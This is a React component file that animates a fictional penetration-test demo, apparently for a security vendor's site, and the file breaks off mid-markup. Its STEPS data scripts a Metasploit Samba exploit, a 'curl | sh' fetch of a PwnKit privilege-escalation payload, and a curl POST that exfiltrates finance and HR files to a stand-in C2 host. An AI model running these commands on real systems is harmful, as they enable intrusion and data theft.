import { motion, useInView, AnimatePresence } from "framer-motion";
import { useRef, useState, useEffect, useCallback } from "react";

/**
 * Realistic Pentest Simulation
 * Cinematic network topology + dual terminal + live attack metrics.
 * Attack SUCCEEDS — proving the gaps before remediation.
 */

/* ── Attack Phases ── */
const STEPS = [
  {
    name: "Recon",
    label: "Reconnaissance",
    icon: "M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z",
    color: "#f59e0b",
    result: "12 open ports found",
    metric: { label: "Ports Discovered", value: "12", sub: "4 hosts up" },
    cmd: [
      "┌──(root㉿kali)-[~]",
      "└─# nmap -sV -sC -O 192.168.1.0/24 --script vuln",
      "",
      "Starting Nmap 7.94SVN ( https://nmap.org )",
      "Scanning 4 hosts [1000 ports/host]...",
      "",
      "Nmap scan report for 192.168.1.10 (ubuntu-srv)",
      "PORT     STATE SERVICE     VERSION",
      "22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu",
      "80/tcp   open  http        Apache httpd 2.4.52",
      "445/tcp  open  netbios-ssn Samba smbd 4.18.6",
      "3306/tcp open  mysql       MySQL 8.0.36-0ubuntu",
      "",
      "| smb-vuln-recon: Samba < 4.19 — CVE-2017-7494",
      "|   State: LIKELY VULNERABLE",
      "|   Risk:  Remote Code Execution",
      "",
      "Nmap scan report for 192.168.1.20 (win-finance)",
      "PORT     STATE SERVICE  VERSION",
      "135/tcp  open  msrpc    Windows RPC",
      "445/tcp  open  smb      Windows Server 2019",
      "3389/tcp open  rdp      Microsoft Terminal",
      "",
      "OS: Ubuntu 22.04 LTS / Windows Server 2019",
      "[+] 4 hosts up — 12 open ports — 1 critical CVE",
    ],
  },
  {
    name: "Exploit",
    label: "Exploitation",
    icon: "M13 10V3L4 14h7v7l9-11h-7z",
    color: "#ef4444",
    result: "Reverse shell opened",
    metric: { label: "Sessions Opened", value: "1", sub: "Meterpreter" },
    cmd: [
      "┌──(root㉿kali)-[~]",
      "└─# msfconsole -q",
      "",
      "       =[ metasploit v6.4.1-dev ]",
      "+ -- --=[ 2397 exploits - 1239 payloads ]",
      "",
      "msf6 > use exploit/linux/samba/is_known_pipename",
      "msf6 exploit(samba) > set RHOSTS 192.168.1.10",
      "RHOSTS => 192.168.1.10",
      "msf6 exploit(samba) > set LHOST 192.168.1.50",
      "LHOST => 192.168.1.50",
      "msf6 exploit(samba) > set LPORT 4444",
      "msf6 exploit(samba) > exploit",
      "",
      "[*] 192.168.1.10:445 - Using location /tmp for writable ...",
      "[*] Started reverse TCP handler on 192.168.1.50:4444",
      "[*] 192.168.1.10:445 - Sending stage (3045380 bytes)...",
      "[+] 192.168.1.10:445 - Meterpreter session 1 opened!",
      "",
      "meterpreter > getuid",
      "Server username: www-data",
      "meterpreter > sysinfo",
      "Computer     : ubuntu-server",
      "OS           : Ubuntu 22.04 (Linux 5.15.0-91)",
      "Architecture : x64",
      "Meterpreter  : x64/linux",
    ],
  },
  {
    name: "PrivEsc",
    label: "Privilege Escalation",
    icon: "M5 11l7-7 7 7M5 19l7-7 7 7",
    color: "#a855f7",
    result: "Root access obtained",
    metric: { label: "Privilege Level", value: "root", sub: "uid=0" },
    cmd: [
      "meterpreter > shell",
      "Process 2847 created.",
      "",
      "www-data@ubuntu-server:/$ id",
      "uid=33(www-data) gid=33(www-data)",
      "",
      "www-data@ubuntu-server:/$ wget -q http://192.168.1.50:8080/linpeas.sh",
      "www-data@ubuntu-server:/$ chmod +x linpeas.sh && ./linpeas.sh",
      "",
      "╔══════════╣ CVE-2021-4034 (PwnKit)",
      "║ pkexec --version → 0.105",
      "╚ Status: VULNERABLE ← polkit < 0.120",
      "",
      "www-data@ubuntu-server:/$ curl -sL http://192.168.1.50:8080/pwnkit | sh",
      "",
      "[*] Overwriting /usr/bin/pkexec...",
      "[*] Triggering SUID binary...",
      "[+] uid=0(root) gid=0(root) groups=0(root)",
      "",
      "root@ubuntu-server:/# whoami && hostname",
      "root",
      "ubuntu-server",
    ],
  },
  {
    name: "Exfil",
    label: "Data Exfiltration",
    icon: "M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12",
    color: "#ef4444",
    result: "4.2 MB exfiltrated",
    metric: { label: "Data Exfiltrated", value: "4.2 MB", sub: "No DLP block" },
    cmd: [
      "root@ubuntu-server:/# find / -name '*.xlsx' -o -name '*.csv' \\",
      "  -o -name '*.pdf' 2>/dev/null | head -20",
      "",
      "/home/finance/Q4-Budget-2025.xlsx        (2.1 MB)",
      "/home/finance/IBAN-accounts.csv          (340 KB)",
      "/home/rh/employee-salaries.xlsx          (890 KB)",
      "/home/rh/contrats-CDI-2024.pdf           (1.2 MB)",
      "",
      "root@ubuntu-server:/# tar czf /tmp/.cache.tar.gz \\",
      "  /home/finance/ /home/rh/ 2>/dev/null",
      "",
      "root@ubuntu-server:/# ls -lh /tmp/.cache.tar.gz",
      "-rw-r--r-- 1 root root 4.2M Feb 28 03:14 /tmp/.cache.tar.gz",
      "",
      "root@ubuntu-server:/# curl -sk -X POST \\",
      "  https://c2.attacker-infra.net/exfil \\",
      "  -H 'X-Key: a8f3...' \\",
      "  -F 'file=@/tmp/.cache.tar.gz'",
      "",
      "{\"status\":\"received\",\"size\":\"4.2MB\",\"files\":4}",
      "",
      "[+] Exfiltration complete — 4.2 MB transferred",
      "[+] No DLP engine detected. No alert triggered.",
      "[+] Zero security controls blocked this transfer.",
    ],
  },
];

/* ── Auto-typing hook ── */
function useTypingEffect(lines, active, speed = 18) {
  const [displayed, setDisplayed] = useState([]);
  const timeoutRef = useRef(null);

  useEffect(() => {
    if (!active) { setDisplayed([]); return; }
    setDisplayed([]);
    let li = 0, ci = 0;
    const buf = [];
    function tick() {
      if (li >= lines.length) return;
      const line = lines[li];
      if (ci <= line.length) {
        buf[li] = line.slice(0, ci);
        setDisplayed([...buf]);
        ci++;
        timeoutRef.current = setTimeout(tick, ci === 1 ? 60 : speed);
      } else { li++; ci = 0; timeoutRef.current = setTimeout(tick, 90); }
    }
    tick();
    return () => clearTimeout(timeoutRef.current);
  }, [active, lines, speed]);

  return displayed;
}

/* ── Realistic Terminal ── */
function Terminal({ lines, label, active, stepColor }) {
  const typed = useTypingEffect(lines, active);
  const scrollRef = useRef(null);
  useEffect(() => { if (scrollRef.current) scrollRef.current.scrollTop = scrollRef.current.scrollHeight; }, [typed]);

  const colorLine = (line) => {
    if (line.startsWith("┌──") || line.startsWith("└─"))
      return "text-[#50fa7b]";
    if (line.startsWith("root@") || line.startsWith("www-data@"))
      return "text-[#50fa7b]";
    if (line.startsWith("msf6") || line.startsWith("meterpreter"))
      return "text-[#8be9fd]";
    if (line.startsWith("[+]"))
      return "text-[#ff5555] font-semibold";
    if (line.startsWith("[*]"))
      return "text-[#6272a4]";
    if (line.startsWith("╔") || line.startsWith("║") || line.startsWith("╚"))
      return "text-[#ffb86c]";
    if (line.startsWith("|"))
      return "text-[#f1fa8c]";
    if (line.match(/VULN/i))
      return "text-[#ff5555]";
    return "text-[#6272a4]";
  };

  return (
    <div className="overflow-hidden rounded-xl border border-navy-700/80 bg-[#0d1117] shadow-2xl">
      {/* Title bar — macOS style */}
      <div className="flex items-center gap-2 border-b border-[#161b22] bg-[#0d1117] px-4 py-2.5">
        <span className="h-[10px] w-[10px] rounded-full bg-[#ff5f57]" />
        <span className="h-[10px] w-[10px] rounded-full bg-[#febc2e]" />
        <span className="h-[10px] w-[10px] rounded-full bg-[#28c840]" />
        <span className="ml-3 flex items-center gap-1.5 font-mono text-[10px] text-[#6272a4]">
          <svg className="h-3 w-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2}>
            <path d="M4 17l6-6-6-6M12 19h8" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
          root@kali — {label}
        </span>
        {active && (
          <motion.span
            className="ml-auto flex items-center gap-1 text-[9px] font-bold"
            style={{ color: stepColor }}
            animate={{ opacity: [0.5, 1, 0.5] }}
            transition={{ duration: 1.5, repeat: Infinity }}
          >
            <span className="h-1.5 w-1.5 rounded-full" style={{ backgroundColor: stepColor }} />
            LIVE
          </motion.span>
        )}
      </div>
      {/* Output */}
      <div ref={scrollRef} className="h-[200px] sm:h-[280px] overflow-y-auto px-3 sm:px-4 py-3 font-mono text-[10px] sm:text-[11px] leading-[1.75] scrollbar-thin"
        style={{ fontFamily: "'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace" }}>
        {typed.map((line, i) => (
          <div key={i} className={colorLine(line)}>
            {line || "\u00A0"}
            {i === typed.length - 1 && active && (
              <motion.span className="ml-0.5 inline-block h-3.5 w-[7px] bg-[#50fa7b] align-middle"
                animate={{ opacity: [1, 0] }} transition={{ duration: 0.53, repeat: Infinity }} />
            )}
          </div>
        ))}
        {typed.length === 0 && (
          <div className="flex h-full flex-col items-center justify-center gap-2 text-[10px] text-[#6272a4]">
            <svg className="h-5 w-5 animate-pulse" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={1.5}>
              <path d="M4 17l6-6-6-6M12 19h8" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            Awaiting attack sequence...
          </div>
        )}
      </div>
    </div>
  );
}

/* ────────────────────────────────────────────────────────────
   Realistic Network Topology SVG
   ────────────────────────────────────────────────────────────
   Layout:
   
   [ATTACKER ZONE]       [INTERNAL LAN]             [INTERNET]
     Kali Linux  ── vSwitch ── Ubuntu Server ─── C2 Server
                       │
                 Win-Finance
   ──────────────────────────────────────────────────────────── */
function NetworkMap({ activeStep }) {
  const ref = useRef(null);
  const isInView = useInView(ref, { once: true, margin: "-40px" });

  const nodes = [
    { id: "kali",     label: "Kali Linux",     sub: "192.168.1.50",   x: 80,  y: 90,  w: 68, h: 52, zone: "attacker" },
    { id: "switch",   label: "vSwitch",        sub: "VMnet (NAT)",    x: 250, y: 90,  w: 56, h: 52, zone: "internal" },
    { id: "ubuntu",   label: "Ubuntu Srv",     sub: "192.168.1.10",   x: 420, y: 55,  w: 68, h: 52, zone: "internal" },
    { id: "finance",  label: "Win-Finance",    sub: "192.168.1.20",   x: 420, y: 140, w: 68, h: 52, zone: "internal" },
    { id: "c2",       label: "C2 Server",      sub: "ext:443",        x: 610, y: 90,  w: 60, h: 52, zone: "external" },
  ];

  const edges = [
    { from: 0, to: 1 },
    { from: 1, to: 2 },
    { from: 1, to: 3 },
    { from: 2, to: 4 },
  ];

  const activeEdges = [
    [0, 1],       // Recon: kali → switch → ubuntu
    [0, 1],       // Exploit: same path, exploit ubuntu
    [0, 1, 2],    // PrivEsc: + lateral to finance
    [0, 1, 2, 3], // Exfil: + ubuntu → c2
  ];

  const lit = activeStep >= 0 && activeStep < activeEdges.length ? activeEdges[activeStep] : [];

  const nodeState = (idx) => {
    if (activeStep < 0) return "idle";
    if (idx === 0) return "active";       // kali always active
    if (idx === 1) return activeStep >= 0 ? "active" : "idle";  // switch
    if (idx === 2) return activeStep >= 1 ? "compromised" : "idle";
    if (idx === 3) return activeStep >= 2 ? "compromised" : "idle";
    if (idx === 4) return activeStep >= 3 ? "active" : "idle";
    return "idle";
  };

  const stateColor = (state, id) => {
    if (state === "compromised") return "#ef4444";
    if (state === "active" && id === "kali") return "#50fa7b";
    if (state === "active" && id === "c2") return "#ef4444";
    if (state === "active") return "#3b82f6";
    return "#1e293b";
  };

  return (
    <div ref={ref} className="rounded-xl border border-navy-700/40 bg-[#060a14] p-2 sm:p-3 overflow-x-auto">
      {/* Zone labels */}
      <div className="mb-1 flex justify-between px-2">
        {[
          { label: "ATTACKER", color: "#ef4444", x: "8%" },
          { label: "INTERNAL LAN", color: "#3b82f6", x: "45%" },
          { label: "INTERNET", color: "#6272a4", x: "87%" },
        ].map((z) => (
          <span key={z.label} className="font-mono text-[7px] font-bold tracking-[0.15em]"
            style={{ color: z.color + "80" }}>{z.label}</span>
        ))}
      </div>

      <svg viewBox="0 0 730 210" className="w-full" style={{ minWidth: 500, minHeight: 140 }}>
        <defs>
          {/* Glow filters */}
          <filter id="glow-red" x="-50%" y="-50%" width="200%" height="200%">
            <feGaussianBlur stdDeviation="3" result="blur" />
            <feComposite in="SourceGraphic" in2="blur" operator="over" />
          </filter>
          <filter id="glow-green" x="-50%" y="-50%" width="200%" height="200%">
            <feGaussianBlur stdDeviation="2.5" result="blur" />
            <feComposite in="SourceGraphic" in2="blur" operator="over" />
          </filter>
          {/* Grid pattern */}
          <pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse">
            <path d="M 20 0 L 0 0 0 20" fill="none" stroke="#0f172a" strokeWidth="0.3" />
          </pattern>
        </defs>

        {/* Background grid */}
        <rect width="730" height="210" fill="url(#grid)" opacity="0.5" />

        {/* Zone separators */}
        {[190, 560].map((x) => (
          <line key={x} x1={x} y1={5} x2={x} y2={205} stroke="#1e293b" strokeWidth={0.5} strokeDasharray="3 6" />
        ))}

        {/* ── Edges ── */}
        {edges.map((e, i) => {
          const a = nodes[e.from], b = nodes[e.to];
          const on = lit.includes(i);
          const ax = a.x + a.w / 2, ay = a.y + a.h / 2;
          const bx = b.x + b.w / 2, by = b.y + b.h / 2;
          return (
            <g key={`e${i}`}>
              {/* Cable */}
              <line x1={ax} y1={ay} x2={bx} y2={by}
                stroke={on ? "#ef444460" : "#1e293b50"} strokeWidth={on ? 2 : 0.8}
                strokeDasharray={on ? "0" : "4 4"} />

              {/* Connection speed label */}
              {on && (
                <motion.text
                  x={(ax + bx) / 2} y={(ay + by) / 2 - 8}
                  fill="#ef444460" fontSize="5.5" textAnchor="middle"
                  fontFamily="JetBrains Mono, monospace"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                >
                  {i === 3 ? "HTTPS:443" : "TCP"}
                </motion.text>
              )}

              {/* Animated packet (pulsing dot + trail) */}
              {on && (
                <>
                  {/* Trail */}
                  <motion.circle r={6} fill="none" stroke="#ef4444" strokeWidth={0.4}
                    animate={{ cx: [ax, bx], cy: [ay, by], opacity: [0, 0.3, 0] }}
                    transition={{ duration: 1.5, repeat: Infinity, repeatDelay: 0.6, delay: i * 0.2 }}
                  />
                  {/* Main packet */}
                  <motion.circle r={3} fill="#ef4444"
                    animate={{ cx: [ax, bx], cy: [ay, by], opacity: [0, 1, 1, 0] }}
                    transition={{ duration: 1.5, repeat: Infinity, repeatDelay: 0.6, delay: i * 0.2 }}
                    filter="url(#glow-red)"
                  />
                </>
              )}
            </g>
          );
        })}

        {/* ── Nodes ── */}
        {nodes.map((n, i) => {
          const st = nodeState(i);
          const col = stateColor(st, n.id);
          const on = st !== "idle";

          return (
            <motion.g key={n.id}
              initial={{ opacity: 0, y: 8 }}
              animate={isInView ? { opacity: 1, y: 0 } : {}}
              transition={{ delay: 0.1 + i * 0.06 }}
            >
              {/* Pulse ring */}
              {on && (
                <motion.rect
                  x={n.x - 4} y={n.y - 4} width={n.w + 8} height={n.h + 8} rx={12}
                  fill="none" stroke={col} strokeWidth={0.6}
                  animate={{ opacity: [0.4, 0, 0.4] }}
                  transition={{ duration: 2.5, repeat: Infinity }}
                />
              )}

              {/* Machine body */}
              <rect x={n.x} y={n.y} width={n.w} height={n.h} rx={8}
                fill={on ? col + "08" : "#0a0f1a"}
                stroke={col} strokeWidth={on ? 1.5 : 0.6} />

              {/* ── Machine-specific illustration ── */}
              {n.id === "kali" && (
                /* Kali: Laptop with screen content */
                <g>
                  {/* Laptop body */}
                  <rect x={n.x + 16} y={n.y + 8} width={36} height={22} rx={2}
                    fill="#0d1117" stroke={on ? "#50fa7b" : "#334155"} strokeWidth={1} />
                  {/* Screen lines (code) */}
                  {[0, 4, 8, 12].map((dy) => (
                    <line key={dy} x1={n.x + 20} y1={n.y + 13 + dy} x2={n.x + 20 + 12 + (dy % 8) * 2} y2={n.y + 13 + dy}
                      stroke={on ? "#50fa7b" : "#1e293b"} strokeWidth={0.8} />
                  ))}
                  {/* Keyboard base */}
                  <line x1={n.x + 13} y1={n.y + 33} x2={n.x + 55} y2={n.y + 33}
                    stroke={on ? "#50fa7b60" : "#1e293b"} strokeWidth={1.5} strokeLinecap="round" />
                  {/* OS badge */}
                  <rect x={n.x + 4} y={n.y + 6} width={12} height={10} rx={2}
                    fill={on ? "#50fa7b15" : "transparent"} stroke={on ? "#50fa7b50" : "#1e293b"} strokeWidth={0.6} />
                  <text x={n.x + 10} y={n.y + 13.5} fill={on ? "#50fa7b" : "#334155"} fontSize="5"
                    fontWeight="900" textAnchor="middle" fontFamily="monospace">K</text>
                </g>
              )}

              {n.id === "switch" && (
                /* vSwitch: VMware virtual switch */
                <g>
                  {/* Cloud-shaped body */}
                  <rect x={n.x + 8} y={n.y + 12} width={40} height={28} rx={5}
                    fill="#0d1117" stroke={on ? "#3b82f6" : "#1e293b"} strokeWidth={0.8} />
                  {/* VMware diamond logo */}
                  <path d={`M${n.x + 28} ${n.y + 18} l6 8 -6 8 -6 -8 z`}
                    fill="none" stroke={on ? "#3b82f6" : "#1e293b"} strokeWidth={0.7} />
                  {/* Virtual port indicators */}
                  {[0, 1, 2].map((p) => (
                    <g key={p}>
                      <circle cx={n.x + 16 + p * 8} cy={n.y + 38} r={2}
                        fill={on && p < 2 ? "#3b82f640" : "#0f172a"}
                        stroke={on ? "#3b82f6" : "#1e293b"} strokeWidth={0.4} />
                      {on && p < 2 && (
                        <motion.circle cx={n.x + 16 + p * 8} cy={n.y + 38} r={1}
                          fill="#3b82f6" animate={{ opacity: [0.3, 1, 0.3] }}
                          transition={{ duration: 0.8, repeat: Infinity, delay: p * 0.2 }} />
                      )}
                    </g>
                  ))}
                  {/* VMnet label */}
                  <text x={n.x + 28} y={n.y + 46} fill={on ? "#3b82f680" : "#1e293b"} fontSize="3.5"
                    textAnchor="middle" fontFamily="monospace">VMnet8</text>
                </g>
              )}

              {n.id === "ubuntu" && (
                /* Ubuntu Server: Rack unit with Ubuntu circle */
                <g>
                  {[0, 11, 22].map((dy) => (
                    <g key={dy}>
                      <rect x={n.x + 10} y={n.y + 6 + dy} width={48} height={9} rx={1.5}
                        fill="#0d1117"
                        stroke={st === "compromised" ? "#ef4444" : on ? "#06b6d4" : "#1e293b"}
                        strokeWidth={0.7} />
                      {/* Activity LED */}
                      <circle cx={n.x + 52} cy={n.y + 10.5 + dy} r={1.5}
                        fill={st === "compromised" ? "#ef4444" : on ? "#06b6d4" : "#1e293b"} />
                      {/* Drive lines */}
                      {[0, 3, 6].map((dx) => (
                        <line key={dx} x1={n.x + 14 + dx * 3} y1={n.y + 8 + dy} x2={n.x + 14 + dx * 3} y2={n.y + 13 + dy}
                          stroke={st === "compromised" ? "#ef444430" : "#1e293b30"} strokeWidth={0.5} />
                      ))}
                    </g>
                  ))}
                  {/* Ubuntu circle badge */}
                  <circle cx={n.x + 5} cy={n.y + 10} r={4}
                    fill={st === "compromised" ? "#ef444420" : "#e9541310"}
                    stroke={st === "compromised" ? "#ef4444" : "#e95413"} strokeWidth={0.8} />
                  <text x={n.x + 5} y={n.y + 12.5} fill={st === "compromised" ? "#ef4444" : "#e95413"} fontSize="5"
                    fontWeight="900" textAnchor="middle" fontFamily="sans-serif">U</text>
                </g>
              )}

              {n.id === "finance" && (
                /* Windows Finance machine: Desktop PC with monitor */
                <g>
                  {/* Monitor */}
                  <rect x={n.x + 14} y={n.y + 6} width={40} height={26} rx={2}
                    fill="#0d1117"
                    stroke={st === "compromised" ? "#ef4444" : on ? "#3b82f6" : "#1e293b"} strokeWidth={0.8} />
                  {/* Screen grid (spreadsheet) */}
                  {[0, 5, 10, 15].map((dx) => (
                    <line key={`v${dx}`} x1={n.x + 20 + dx} y1={n.y + 10} x2={n.x + 20 + dx} y2={n.y + 28}
                      stroke={st === "compromised" ? "#ef444420" : "#1e293b30"} strokeWidth={0.3} />
                  ))}
                  {[0, 4, 8, 12].map((dy) => (
                    <line key={`h${dy}`} x1={n.x + 18} y1={n.y + 12 + dy} x2={n.x + 50} y2={n.y + 12 + dy}
                      stroke={st === "compromised" ? "#ef444420" : "#1e293b30"} strokeWidth={0.3} />
                  ))}
                  {/* Stand */}
                  <line x1={n.x + 34} y1={n.y + 32} x2={n.x + 34} y2={n.y + 38}
                    stroke={st === "compromised" ? "#ef444460" : "#1e293b"} strokeWidth={1} />
                  <line x1={n.x + 26} y1={n.y + 38} x2={n.x + 42} y2={n.y + 38}
                    stroke={st === "compromised" ? "#ef444460" : "#1e293b"} strokeWidth={1} strokeLinecap="round" />
                  {/* Windows badge */}
                  <rect x={n.x + 4} y={n.y + 6} width={9} height={9} rx={1}
                    fill={st === "compromised" ? "#ef444415" : "#3b82f615"}
                    stroke={st === "compromised" ? "#ef4444" : "#3b82f6"} strokeWidth={0.5} />
                  {/* 4-pane Windows logo */}
                  <line x1={n.x + 8.5} y1={n.y + 7.5} x2={n.x + 8.5} y2={n.y + 13.5}
                    stroke={st === "compromised" ? "#ef4444" : "#3b82f6"} strokeWidth={0.5} />
                  <line x1={n.x + 5.5} y1={n.y + 10.5} x2={n.x + 11.5} y2={n.y + 10.5}
                    stroke={st === "compromised" ? "#ef4444" : "#3b82f6"} strokeWidth={0.5} />
                </g>
              )}

              {n.id === "c2" && (
                /* C2: Skull/danger server */
                <g>
                  <rect x={n.x + 10} y={n.y + 8} width={40} height={36} rx={4}
                    fill="#0d1117" stroke={on ? "#ef4444" : "#1e293b"} strokeWidth={0.8} />
                  {/* Skull-ish icon */}
                  <circle cx={n.x + 30} cy={n.y + 22} r={8}
                    fill={on ? "#ef444415" : "transparent"}
                    stroke={on ? "#ef4444" : "#1e293b"} strokeWidth={0.8} />
                  {/* Eyes */}
                  <circle cx={n.x + 27} cy={n.y + 20} r={1.5}
                    fill={on ? "#ef4444" : "#1e293b"} />
                  <circle cx={n.x + 33} cy={n.y + 20} r={1.5}
                    fill={on ? "#ef4444" : "#1e293b"} />
                  {/* Nose */}
                  <path d={`M${n.x + 29} ${n.y + 24} l1.5 -2 l1.5 2`}
                    fill="none" stroke={on ? "#ef4444" : "#1e293b"} strokeWidth={0.6} />
                  {/* Teeth */}
                  {[0, 3, 6].map((dx) => (
                    <line key={dx} x1={n.x + 27 + dx} y1={n.y + 26} x2={n.x + 27 + dx} y2={n.y + 28}
                      stroke={on ? "#ef444480" : "#1e293b"} strokeWidth={0.6} />
                  ))}
                </g>
              )}

              {/* Label */}
              <text x={n.x + n.w / 2} y={n.y + n.h + 12} fill={on ? "#e2e8f0" : "#475569"}
                fontSize="7" fontWeight="700" textAnchor="middle"
                fontFamily="Inter, system-ui">{n.label}</text>
              <text x={n.x + n.w / 2} y={n.y + n.h + 20} fill={on ? "#64748b" : "#1e293b"}
                fontSize="5.5" textAnchor="middle"
                fontFamily="'JetBrains Mono', monospace">{n.sub}</text>

              {/* Status badges */}
              {st === "compromised" && (
                <motion.g initial={{ scale: 0 }} animate={{ scale: 1 }}>
                  <rect x={n.x + n.w - 6} y={n.y - 5} width={14} height={10} rx={3}
                    fill="#ef4444" />
                  <text x={n.x + n.w + 1} y={n.y + 2} fill="white" fontSize="5.5"
                    fontWeight="900" textAnchor="middle">!</text>
                </motion.g>
              )}

            </motion.g>
          );
        })}

        {/* ── Exfil data stream ── */}
        <AnimatePresence>
          {activeStep >= 3 && (
            <motion.g initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
              {/* Multiple data particles */}
              {[0, 0.5, 1].map((delay) => (
                <motion.rect key={delay} width={8} height={4} rx={1} fill="#ef4444"
                  animate={{
                    x: [nodes[2].x + 68, nodes[4].x + 30],
                    y: [nodes[2].y + 26, nodes[4].y + 26],
                    opacity: [0, 0.8, 0],
                  }}
                  transition={{ duration: 1.8, repeat: Infinity, delay, repeatDelay: 0.3 }}
                  filter="url(#glow-red)"
                />
              ))}
              {/* DATA EXFIL label */}
              <motion.g animate={{ opacity: [0.4, 1, 0.4] }} transition={{ duration: 1.2, repeat: Infinity }}>
                <rect x={545} y={66} width={52} height={12} rx={3} fill="#ef444420" stroke="#ef4444" strokeWidth={0.5} />
                <text x={571} y={74.5} fill="#ef4444" fontSize="5.5" fontWeight="900"
                  textAnchor="middle" fontFamily="monospace">DATA EXFIL</text>
              </motion.g>
            </motion.g>
          )}
        </AnimatePresence>
      </svg>
    </div>
  );
}

/* ── Live Attack Metrics Panel ── */
function AttackMetrics({ activeStep, done }) {
  const metrics = [
    { label: "Target",      value: activeStep >= 0 ? "192.168.1.0/24" : "—", color: "#f59e0b" },
    { label: "Phase",       value: activeStep >= 0 ? STEPS[activeStep].name : "Idle", color: STEPS[Math.max(0, activeStep)]?.color || "#6272a4" },
    { label: "Sessions",    value: activeStep >= 1 ? "1" : "0", color: activeStep >= 1 ? "#ef4444" : "#6272a4" },
    { label: "Privilege",   value: activeStep >= 2 ? "root" : activeStep >= 1 ? "www-data" : "—", color: activeStep >= 2 ? "#a855f7" : "#6272a4" },
    { label: "Exfiltrated", value: activeStep >= 3 ? "4.2 MB" : "0 B", color: activeStep >= 3 ? "#ef4444" : "#6272a4" },
    { label: "DLP Alert",   value: "NONE", color: done ? "#ef4444" : "#6272a4" },
  ];

  return (
    <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 md:grid-cols-6">
      {metrics.map((m) => (
        <motion.div key={m.label}
          className="rounded-lg border border-navy-700/40 bg-[#060a14] px-3 py-2 text-center"
          animate={m.label === "DLP Alert" && done ? { borderColor: ["#1e293b40", "#ef444460", "#1e293b40"] } : {}}
          transition={{ duration: 1.5, repeat: Infinity }}
        >
          <p className="text-[8px] font-semibold uppercase tracking-wider text-gray-600">{m.label}</p>
          <p className="mt-0.5 font-mono text-[11px] font-bold" style={{ color: m.color }}>{m.value}</p>
        </motion.div>
      ))}
    </div>
  );
}

/* ── Main Component ── */
export default function AttackFlowDiagram() {
  const ref = useRef(null);
  const isInView = useInView(ref, { once: true, margin: "-80px" });
  const [active, setActive] = useState(-1);
  const [started, setStarted] = useState(false);
  const [done, setDone] = useState(false);
  const timerRef = useRef(null);

  const run = useCallback(() => {
    setActive(-1);
    setDone(false);
    setStarted(true);
    let step = 0;
    setTimeout(() => {
      setActive(0);
      timerRef.current = setInterval(() => {
        step++;
        if (step >= STEPS.length) {
          clearInterval(timerRef.current);
          setTimeout(() => setDone(true), 800);
          return;
        }
        setActive(step);
      }, 5000);
    }, 400);
  }, []);

  useEffect(() => {
    if (isInView && !started) run();
    return () => clearInterval(timerRef.current);
  }, [isInView, started, run]);

  const replay = () => {
    clearInterval(timerRef.current);
    setStarted(false);
    setActive(-1);
    setDone(false);
    setTimeout(run, 200);
  };

  const current = active >= 0 ? STEPS[active] : null;

  return (
    <div ref={ref} className="space-y-4">

      {/* ─── Header ─── */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <motion.div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-500/10 ring-1 ring-red-500/20"
            animate={active >= 0 ? { boxShadow: ["0 0 0 0 #ef444400", "0 0 0 8px #ef444415", "0 0 0 0 #ef444400"] } : {}}
            transition={{ duration: 2, repeat: Infinity }}>
            <svg className="h-4 w-4 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z" />
            </svg>
          </motion.div>
          <div>
            <p className="text-sm font-bold text-white">Pentest Simulation</p>
            <p className="hidden sm:block text-[10px] text-gray-500">Controlled lab environment — authorized red team exercise</p>
          </div>
        </div>
        <button onClick={replay}
          className="flex items-center gap-1.5 rounded-lg border border-navy-700 px-3 py-1.5 text-[10px] font-semibold text-gray-400 transition hover:border-red-500/40 hover:text-white">
          <svg className="h-3 w-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2}>
            <path d="M1 4v6h6M23 20v-6h-6" strokeLinecap="round" strokeLinejoin="round" />
            <path d="M20.49 9A9 9 0 005.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 013.51 15" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
          Replay
        </button>
      </div>

      {/* ─── Attack Phase Timeline ─── */}
      <div className="grid grid-cols-2 gap-1.5 sm:flex sm:items-stretch">
        {STEPS.map((step, i) => {
          const isActive = active === i;
          const isDone = active > i || done;
          return (
            <div key={step.name} className="flex flex-1 items-center">
              <motion.button
                onClick={() => setActive(i)}
                className={`relative flex w-full flex-col items-center gap-1.5 rounded-xl border px-2 py-3 transition-all ${
                  isActive
                    ? "border-red-500/40 bg-red-500/[0.06]"
                    : isDone
                      ? "border-emerald-500/20 bg-emerald-500/[0.04]"
                      : "border-navy-800 bg-navy-950/40"
                }`}
                animate={isActive ? { scale: 1.03 } : { scale: 1 }}
              >
                <div className={`flex h-9 w-9 items-center justify-center rounded-full ${
                  isActive ? "bg-red-500/15 ring-2 ring-red-500/30" : isDone ? "bg-emerald-500/10" : "bg-navy-800/40"
                }`}>
                  {isDone && !isActive ? (
                    <svg className="h-4 w-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                    </svg>
                  ) : (
                    <svg className="h-4 w-4" style={{ color: isActive ? step.color : "#475569" }}
                      fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}
                      strokeLinecap="round" strokeLinejoin="round">
                      <path d={step.icon} />
                    </svg>
                  )}
                </div>
                <span className={`text-[10px] font-bold ${isActive ? "text-white" : isDone ? "text-emerald-400/70" : "text-gray-600"}`}>
                  {step.name}
                </span>
                <AnimatePresence>
                  {(isActive || isDone) && (
                    <motion.span
                      initial={{ opacity: 0, height: 0 }}
